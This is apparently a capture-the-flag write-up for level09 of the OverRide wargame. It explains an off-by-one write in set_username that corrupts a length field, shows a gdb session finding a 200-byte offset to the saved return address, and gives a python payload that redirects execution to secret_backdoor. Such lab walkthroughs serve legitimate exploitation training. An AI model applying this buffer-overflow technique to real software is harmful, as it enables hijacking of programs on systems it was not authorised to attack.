This binary has 3 important functions :  
`set_message`, `set_username`, `secret_backdoor`  
and a data structure :  
```C
typedef struct s_message {
    char text[140];      // offset 0x00
    char username[40];   // offset 0x8c
    int len;             // offset 0xb4
} t_message;
```

The vulnerability lies in the setup of the the username since the function `set_username` writes 1 byte more than it should. This write over the value of len meaning we can manipulate the value of len to make believe `set_message` that the message is longer than what it really is and be able to overwrite the EIP if the start of its address is located 248 bytes or less after the beginning of our buffer.

To find the offset to overwrite the RIP :
```C
level09@OverRide:~$ gdb level09 
(gdb) b handle_msg 
Breakpoint 1 at 0x8c4
(gdb) r
Starting program: /home/users/level09/level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------

Breakpoint 1, 0x00005555555548c4 in handle_msg ()
(gdb) info frame
Stack level 0, frame at 0x7fffffffe5e0:
 rip = 0x5555555548c4 in handle_msg; saved rip 0x555555554abd
 called by frame at 0x7fffffffe5f0
 Arglist at 0x7fffffffe5d0, args: 
 Locals at 0x7fffffffe5d0, Previous frame's sp is 0x7fffffffe5e0
 Saved registers:
  rbp at 0x7fffffffe5d0, rip at 0x7fffffffe5d8
(gdb) p 0x7fffffffe5d0 - 0xc0
$1 = 140737488348432
(gdb) x/x 0x7fffffffe5d0 - 0xc0
0x7fffffffe510:	0x0000000a
(gdb) p/x $rbp
$2 = 0x7fffffffe5d0
(gdb) p 0x7fffffffe5d8 - 0x7fffffffe510
$3 = 200
```

So we know that we need to write the address of `secret_backdoor` at offset 200.

payload :  
`( python -c 'print("A"*40 + "\xff")'; python -c 'print("B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00")'; cat ) | ./level09`